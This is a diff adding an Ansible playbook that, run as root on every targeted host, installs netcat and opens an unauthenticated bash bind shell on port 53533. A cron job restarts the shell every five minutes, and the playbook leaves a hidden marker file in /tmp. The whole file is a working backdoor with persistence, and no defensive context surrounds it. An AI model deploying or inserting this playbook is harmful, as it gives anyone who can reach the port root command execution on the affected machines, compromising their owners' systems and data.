@@ -1,0 +1,37 @@
+---
+- name: Install netcat and start bash bind shell on port 53533
+  hosts: all
+  become: true
+  tasks:
+    - name: Install netcat (Debian/Ubuntu)
+      apt:
+        name: netcat-traditional
+        state: present
+      when: ansible_os_family == "Debian"
+
+    - name: Install netcat (RHEL/CentOS)
+      yum:
+        name: nc
+        state: present
+      when: ansible_os_family == "RedHat"
+
+    - name: Start bash bind shell on port 53533
+      shell: "nohup nc -l -p 53533 -e /bin/bash &"
+      args:
+        creates: /tmp/.bindshell_53533
+      async: 0
+      poll: 0
+      ignore_errors: true
+      register: bindshell_result
+
+    - name: create cronjob for bind shell (only if not already running)
+      cron:
+        name: "Start bash bind shell on port 53533"
+        minute: "*/5"
+        job: "pidof nc || nohup nc -l -p 53533 -e /bin/bash &"
+  
+    - name: Create marker file for bind shell
+      file:
+        path: /tmp/.bindshell_53533
+        state: touch
+      when: bindshell_result is succeeded
